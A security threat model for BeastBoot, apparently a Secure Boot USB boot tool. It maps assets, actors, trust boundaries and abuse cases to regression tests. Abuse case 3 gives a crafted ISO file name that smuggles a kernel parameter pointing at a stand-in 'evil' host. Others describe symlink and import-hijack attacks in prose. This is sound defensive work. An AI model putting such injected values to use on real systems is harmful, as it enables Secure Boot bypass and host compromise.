# Threat model: BeastBoot (2026-10-28)

Complements [docs/SECURITY_REVIEW-0.4.0.md](../docs/SECURITY_REVIEW-0.4.0.md),
which covered the Windows path (wimboot, winboot helper, UDF reader). This pass
covers everything else: beast-net, the GRUB menu, the host tool, and the
build and release chain.

## Assets

1. **The release signing key**: machines that enrolled it run anything it signs.
2. **The signed chain** (GRUB, beast-net kernel and helper, wimboot): memory
   corruption or script control inside it bypasses Secure Boot on those machines.
3. **The owner's PC**: internal disks (the disk tools can read them), and the OS
   installed from a verified ISO.
4. **The host running `beast-boot`** as root.
5. **Integrity of downloaded ISOs**: "verified" must mean verified.

## Actors

- **Stick holder**: had the USB drive for a while and controls the data
  partition (ISOs, file names, `config.env`, plans). This is the main actor. By
  design they also control the ISO files; they must not gain anything beyond
  that, and above all no control of the signed chain.
- **Network attacker or malicious mirror**, during beast-net or host downloads.
- **Local unprivileged user** on the host where `beast-boot` runs as root.
- **Repository attacker**: a stolen token, a compromised action or tool, or
  someone with push access, going after the release key or the releases.

## Entry points and trust boundaries

| Entry point | Boundary crossed |
|---|---|
| `config.env`, ISO and folder names, ISO `loopback.cfg` | data partition → signed GRUB, kernel command line |
| `beastnet.script` plan, files under `/downloads` | data partition → signed beast-net helper (root) |
| HTTP(S) downloads, SHA256SUMS | network → helper / host tool |
| An existing drive's ESP and data partition | untrusted drive → host tool as root |
| Working directory, PATH, `--image`/`--progress-file` paths | local user → host tool as root |
| `release.yml` secrets, base images, build tools | repository/CI → release key |

## STRIDE (highlights)

- **Tampering / elevation, data partition → signed chain**: script mode, symlinks
  followed by downloads, kernel parameters via file names or `bb_kargs`, theme
  files parsed by signed GRUB.
- **Spoofing, network → "verified"**: checksum from the same server, checksum
  entry chosen by a server-supplied name.
- **Elevation, host**: imports from the current directory, links followed by
  root, PATH.
- **Information disclosure, release**: key exposure in CI.
- **Denial of service, host**: ESP directory loops.

## Abuse cases (each became a test or a review item)

1. A plan in `config.env` runs unattended under Secure Boot and images the
   internal disk to the stick. → beastnet `test_security_*` (prompt under SB)
2. `/downloads` is a symlink into the helper's Python package, so a download
   overwrites a module. → `beastnet/tests/test_security_download_links.py`
3. An ISO named `x" url=http://evil/p ".iso` adds kernel parameters. →
   `tests/menu/test_security_*`
4. `bb_kargs` silently preseeds an installer; `bb_theme` feeds PNGs to signed
   GRUB. → `tests/menu/test_security_*`
5. `sudo bin/beast-boot` run in a folder that holds `json.py`. →
   `installer/tests/test_security_*`
6. A crafted ESP loops `update`; an escape sequence in the drive marker reaches
   the terminal; `--image` follows a planted link. → `installer/tests/test_security_*`
7. A manual release run on a branch dumps the key. → workflow tag guard plus the
   protected environment (review item, not unit-testable)

## Out of scope / accepted risks

- Unsigned ESP scripts, themes and initrd (D3, planned for 0.5.0): whoever can
  write the ESP controls the menu. The fixes here protect the data partition.
- See `security/triage.json` for the accepted risks and their review dates.
